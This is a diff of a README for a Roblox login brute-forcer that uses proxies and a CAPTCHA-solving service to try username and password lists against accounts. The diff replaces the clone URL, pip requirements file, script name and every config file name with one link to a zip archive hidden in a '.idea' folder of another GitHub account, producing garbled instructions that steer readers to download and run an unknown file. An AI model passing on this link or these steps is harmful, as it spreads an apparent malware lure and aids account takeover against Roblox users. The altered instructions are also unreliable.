@@ -12,54 +12,54 @@ leverages concurrent processing to speed up the login attempts and uses CapSolve
 ## Requirements
 
 - Python 3.6+
-- Required Python packages listed in `requirements.txt`
+- Required Python packages listed in `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
 
 ## Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/nickk431/roblox-bruteforcer.git
+   git clone https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
    cd roblox-bruteforcer
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
    ```
 
 3. Set up your environment:
-    - Add your CapSolver API key in the `capsolver.api_key` variable.
-    - Create `proxies.txt` file with a list of proxies (one per line).
-    - Create `usernames.txt` and `passwords.txt` files with usernames and passwords to test.
+    - Add your CapSolver API key in the `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` variable.
+    - Create `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` file with a list of proxies (one per line).
+    - Create `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` and `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` files with usernames and passwords to test.
 
 ## Usage
 
 To run the bruteforcer, simply execute the main script:
 
 ```bash
-python roblox_bruteforcer.py
+python https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
 ```
 
 ### Configuration
 
 - `num_threads`: Adjust the number of threads for concurrent execution.
-- `capsolver.api_key`: Add your CapSolver API key here.
+- `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`: Add your CapSolver API key here.
 
-## Example `proxies.txt`
+## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
 
 ```
 123.123.123.123:8080
 124.124.124.124:8080
 ```
 
-## Example `usernames.txt`
+## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
 
 ```
 username1
 username2
 ```
 
-## Example `passwords.txt`
+## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
 
 ```
 password1
